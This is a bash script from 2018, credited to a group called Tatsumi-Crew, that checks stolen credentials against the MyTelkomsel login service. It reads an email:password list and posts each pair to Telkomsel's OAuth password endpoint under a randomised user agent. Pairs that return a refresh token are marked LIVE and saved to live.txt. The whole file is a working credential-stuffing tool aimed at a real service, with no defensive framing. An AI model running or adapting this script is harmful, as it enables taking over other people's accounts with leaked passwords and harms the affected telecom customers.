#!/bin/bash
#my.telkomsel.com Checker
#issued on : 09 Agustus 2018
#coded By Arvan Apriyana(van)
clear
header(){
waktu=$(date '+%Y-%m-%d %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
printf "
${PUTIH}
___________________________________________________________

 ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
 ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
    ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
    ██║   ██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
    ██║   ██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
  
  	           MyTelkomsel Account Checker   
  	              www.tatsumi-crew.net 
___________________________________________________________

"
}
tatsumi(){
	ua=$(cat ua.txt | sort -R | head -1)
	url="https://tdwidm.telkomsel.com/oauth/ro"
	ref="https://my.telkomsel.com/"
	send=$(curl -s -A "$ua" -e "$ref" -X POST -d "scope=openid+offline_access&response_type=token&connection=MyTelkomsel-POC&username=$1&password=$2&popup=false&sso=false&device=dde41fb12cddd61519fc282dbb140851%3AMozilla%2F5.0+(X11%3B+Ubuntu%3B+Linux+i686%3B+rv%3A61.0)+Gecko%2F20100101+Firefox%2F61.0&client_id=Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0&grant_type=password" "$url")
	dead=$(echo $send | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ $send =~ "refresh_token" ]]; then
        printf "[Tatsumi-Crew] => $1|$2 ${HIJAU}[LIVE] [$waktu]";
        echo "$1 | $2" >> live.txt
        printf "${NORMAL}"
    elif [[ $dead =~ 'error' ]]; then
        printf "[Tatsumi-Crew] => $1|$2 ${MERAH}[DIE] [$waktu]";
        printf "${NORMAL}"
    else
        printf "[Tatsumi-Crew] => $1|$2 ${MERAH}[DIE] [$waktu]";
        echo ""
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "================================================="
echo "List In This Directory : "
ls
echo "================================================="
echo "Delimeter list -> email:password "
echo -n "Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
	x=$(gawk -F: '{ print $1 }' $list)
	y=$(gawk -F: '{ print $2 }' $list)
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailna=($x)'
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
for (( i = 0; i < "${#emailna[@]}"; i++ )); do
	email1="${emailna[$i]}"
    passwordna1="${passwordna[$i]}"
		tatsumi $email1 $passwordna1
done
